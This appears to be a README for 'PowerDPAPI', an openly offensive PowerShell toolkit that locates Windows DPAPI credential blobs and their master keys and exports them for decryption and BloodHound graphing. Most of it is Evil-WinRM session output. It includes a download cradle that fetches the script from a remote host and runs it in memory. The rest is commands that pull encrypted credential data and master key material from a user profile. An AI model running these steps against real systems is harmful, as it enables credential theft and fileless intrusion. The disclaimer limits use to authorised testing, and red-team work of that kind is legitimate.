# PowerDPAPI
Offensive toolkit for DPAPI written in PowerShell  
Check out my post on medium for a detailed breakdown [Fileless DPAPI Credential Extraction With PowerShell](https://medium.com/p/c9952c136463)

> [!CAUTION]
> Disclaimer: Intended only for use on systems that you are legally authorized to access.
## Functionality
- **Binary Signature Scanning**: Locates DPAPI blobs regardless of file extension using "Magic Byte" detection.
- **Full Header Parsing**: Extracts Master Key GUIDs and blob descriptions from the binary data.
- **Automated Reconnaissance**: Links encrypted blobs to their parent Master Keys within the Windows profile structure.
- **Decryption Readiness**: Provides raw byte/Base64 output of all discovered cryptographic materials.
- **Relationship Mapping**: Exports a graph diagram for BloodHound, visualizing the link between encrypted data and its required keys.
## Usage
### Generate Sample Data
1. Generate an example DPAPI-protected blob
```
*Evil-WinRM* PS C:\Users\sample.user\Documents> .\DPAPIDataExample.exe
[*] Starting ProtectedData example...
[*] Starting protection routine
[*] Using static secret value: maytheschwartzbewithyou
The protected byte array:
0x01 0x00 0x00 0x00 0xD0 0x8C 0x9D 0xDF 0x01 0x15 0xD1 0x11 0x8C 0x7A 0x00 0xC0 0x4F 0xC2 0x97 0xEB 0x01 0x00 0x00 0x00 0x2C 0x75 0x27 0xE3 0x94 0xB3 0x44 0x44 0xA8 0xF9 0x93 0x09 0xE6 0x08 0x73 0x16 0x00 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x00 0x00 0x03 0x66 0x00 0x00 0xC0 0x00 0x00 0x00 0x10 0x00 0x00 0x00 0xB7 0x64 0x64 0xB0 0x50 0x36 0x80 0x32 0xF7 0x8C 0xD6 0xCD 0x2F 0xCC 0x27 0xEC 0x00 0x00 0x00 0x00 0x04 0x80 0x00 0x00 0xA0 0x00 0x00 0x00 0x10 0x00 0x00 0x00 0xCD 0x95 0x17 0x79 0x70 0x45 0xD2 0x25 0x39 0xDE 0xBE 0x29 0xC6 0x4D 0x47 0x3B 0x18 0x00 0x00 0x00 0xB1 0x8D 0x9B 0xB0 0x5C 0x2F 0x00 0x46 0xA2 0xA9 0xCA 0x34 0x0B 0x71 0x35 0xAD 0xB3 0x12 0xB1 0x09 0xD6 0xD2 0x1D 0x45 0x14 0x00 0x00 0x00 0xB6 0x53 0x77 0x84 0xBD 0x20 0xED 0xC8 0x87 0xDB 0xB9 0x71 0x13 0x0F 0xD5 0xBF 0x4F 0x5E 0x65 0xB8
[*] Encrypted output file written.
[*] Starting unprotection routine
[*] No encrypted input found, skipping decryption
[*] Starting registry storage routine
[*] Secret stored under registry key (HKEY_CURRENT_USER): Software\Sysinternals\DPAPIPoC
[*] Done.
*Evil-WinRM* PS C:\Users\sample.user\Documents>
```
2. Use a PowerShell download cradle to load the Invoke-PowerDPAPI.ps1 script
```
*Evil-WinRM* PS C:\Users\sample.user\Documents> IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.183:8080/Invoke-PowerDPAPI.ps1")
*Evil-WinRM* PS C:\Users\sample.user\Documents>
```
### Direct Inspection
```
Invoke-PowerDPAPI -Path <file/directory path> -Format base64 -Verbose
```
```
*Evil-WinRM* PS C:\Users\sample.user\Documents> Invoke-PowerDPAPI -Path "C:\users\sample.user\appdata\roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"
[*] Running PowerDPAPI
**********************************************************************
[!] Probable DPAPI blob found
[>] File: C:\users\sample.user\appdata\roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
[>] MD5 Hash: DD0259EC230BB91EF986E7B97835B0E4
[>] SHA-1 Hash: 8AFFB716BB354D804B35A6DD67A76A282AC14A9C
[>] SHA-256 Hash: 8548009D5C745646B375904CB5531E28622A595652F255A1DF2E5EB50DF3D654
[>] Master Key GUID: 556a2412-1275-4ccf-b721-e6a0b4f90407
[>] Blob Description: Enterprise Credential Data

-------------- START blob output --------------
\x01\x00\x00\x00\x92\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\xD0\x8C\x9D\...redacted
--------------  EOF blob output  --------------
[>] Locating corresponding master key file
[>] Master Key Found:
    C:\Users\sample.user\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
-------------- START master key --------------
\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x35\x00\x35\x00\x36\x00\x61\...redacted
--------------  EOF master key  --------------
**********************************************************************
[*] Done.
*Evil-WinRM* PS C:\Users\sample.user\Documents>
```
**What This Does**
* Scans the target path for DPAPI file signatures.
* Parses the Master Key GUID and Blob Description.
* Automatically resolves the user's SID to locate the required Master Key file.
* Outputs raw bytes in a format ready for copy-pasting into decryption tools.

## BloodHound/OpenGraph Visualization
This workflow demonstrates how to map the cryptographic surface area of a system into a graph database.
**Preparation**
1. Load the DPAPI model using HoundTrainer, curl, or another utility.
2. Scan the target directory for DPAPI blobs and output nodes and edges to 'example.json' in OpenGraph format
```
*Evil-WinRM* PS C:\Users\sample.user\Documents> Invoke-PowerDPAPI -Path C:\dev\training\dpapi\tmp -Graph example.json
[*] Running PowerDPAPI
[!] Detected Raw Binary Data
**********************************************************************
[!] Probable DPAPI blob found
[>] File: C:\dev\training\dpapi\tmp\encrypted.out
[>] MD5 Hash: 47CD9F18369AA46E7F1F2503D9FA4124
[>] SHA-1 Hash: 5D461D2B6715166AF6D630BA01DDD49A5290A98B
[>] SHA-256 Hash: 18E7DC3494CC5DC4C8D0E4DD0EBE7BD9C7C9B30C3C12DA8ED3156172A9699A6D
[>] Master Key GUID: e327752c-b394-4444-a8f9-9309e6087316
[>] Blob Description:
-------------- START blob output --------------
\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\...redacted
--------------  EOF blob output  --------------
[>] Locating corresponding master key file
[>] Master Key Found:
    C:\Users\sample.user\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\e327752c-b394-4444-a8f9-9309e6087316
-------------- START master key --------------
\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x65\x00\x33\...redacted
--------------  EOF master key  --------------
**********************************************************************
[*] Graph output enabled, constructing graph object.
[*] Writing graph object to example.json.
[*] Done.
*Evil-WinRM* PS C:\Users\sample.user\Documents>
```
2. Check graph output
```
*Evil-WinRM* PS C:\Users\sample.user\Documents> type example.json
{
    "metadata":  {
                     "source_kind":  "DPAPI"
                 },
    "graph":  {
                  "nodes":  [
                                {
                                    "id":  "C:\\dev\\training\\dpapi\\tmp\\encrypted.out",
                                    "kinds":  [
                                                  "DPAPIBlob",
                                                  "DPAPI"
                                              ],
                                    "properties":  {
                                                       "name":  "encrypted.out",
                                                       "modified_at":  "2025-12-31 00:02:20",
                                                       "size_bytes":  162,
                                                       "extension":  ".out",
                                                       "created_at":  "2025-12-30 23:53:06",
                                                       "full_path":  "C:\\dev\\training\\dpapi\\tmp\\encrypted.out"
                                                   }
                                },
                                {
                                    "id":  "e327752c-b394-4444-a8f9-9309e6087316",
                                    "kinds":  [
                                                  "DPAPIMasterKey",
                                                  "DPAPI"
                                              ],
                                    "properties":  {
                                                       "Username":  "MACHINE\\sample.user",
                                                       "Owner_SID":  "S-1-5-21-1487982659-1829050783-2281216199-1107",
                                                       "Version":  2,
                                                       "Iterations":  6422573,
                                                       "Salt_Hex":  "65003300320037003700350032006300",
                                                       "Created_At":  "2025-12-30 22:27:56",
                                                       "Full_Path":  "C:\\Users\\sample.user\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-1487982659-1829050783-2281216199-1107\\e327752c-b394-4444-a8f9-9309e6087316",
                                                       "GUID":  "e327752c-b394-4444-a8f9-9309e6087316"
                                                   }
                                }
                            ],
                  "edges":  [
                                {
                                    "kind":  "EncryptedWith",
                                    "start":  {
                                                  "value":  "C:\\dev\\training\\dpapi\\tmp\\encrypted.out"
                                              },
                                    "end":  {
                                                "value":  "e327752c-b394-4444-a8f9-9309e6087316"
                                            },
                                    "properties":  {

                                                   }
                                }
                            ]
              }
}
*Evil-WinRM* PS C:\Users\sample.user\Documents> 
```
3. Upload graph to BloodHound for analysis